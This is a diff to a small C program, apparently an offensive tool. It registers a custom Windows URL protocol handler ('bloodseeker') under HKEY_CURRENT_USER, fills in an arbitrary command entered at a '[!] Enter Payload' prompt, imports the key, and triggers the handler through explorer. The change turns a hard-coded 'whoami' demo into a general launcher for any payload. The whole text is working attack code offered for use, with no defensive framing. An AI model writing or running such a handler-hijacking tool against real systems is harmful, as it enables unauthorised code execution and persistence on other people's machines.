@@ -40,6 +40,7 @@ int main() {
     }
 
     // Write the registry key information to the file
+    fprintf(regFile, "Windows Registry Editor Version 5.00\n\n");
     fprintf(regFile, "[HKEY_CURRENT_USER\\Software\\Classes\\bloodseeker]\n");
     fprintf(regFile, "@=\"URL:bloodseeker Protocol\"\n");
     fprintf(regFile, "\"URL Protocol\"=\"\"\n");
@@ -48,18 +49,30 @@ int main() {
     fprintf(regFile, "\n");
     fprintf(regFile, "[HKEY_CURRENT_USER\\Software\\Classes\\bloodseeker\\shell\\open]\n");
     fprintf(regFile, "\n");
+
+    // Prompt for the payload
+    char payload[256];
+    printf("[!] Enter Payload: ");
+    fgets(payload, sizeof(payload), stdin);
+
+    // Remove trailing newline if present
+    char* newline = strchr(payload, '\n');
+    if (newline != NULL) {
+        *newline = '\0';
+    }
+
     fprintf(regFile, "[HKEY_CURRENT_USER\\Software\\Classes\\bloodseeker\\shell\\open\\command]\n");
-    fprintf(regFile, "@=\"cmd /k whoami && timout /t 10\"\n");
+    fprintf(regFile, "@=\"%s\"\n", payload);
 
     // Close the .reg file
     fclose(regFile);
 
-    printf("[*] Registry key created succesfully!\n");
+    printf("[*] Registry key created successfully!\n");
     printf("[i] Press <Enter> to add registry key to hive");
     getchar();
-    
+
     // Execute the bloodseeker.reg file
-    system("regedit /s bloodseeker.reg");
+    system("cmd.exe /c bloodseeker.reg");
     printf("[*] Registry key added to registry hive!\n");
     printf("[i] Press <Enter> to execute protocol handler");
     getchar();
@@ -67,7 +80,6 @@ int main() {
     system("cmd.exe /k explorer bloodseeker://test");
     printf("[i] Press <Enter> to close program");
     getchar();
-
 
     return 0;
 }
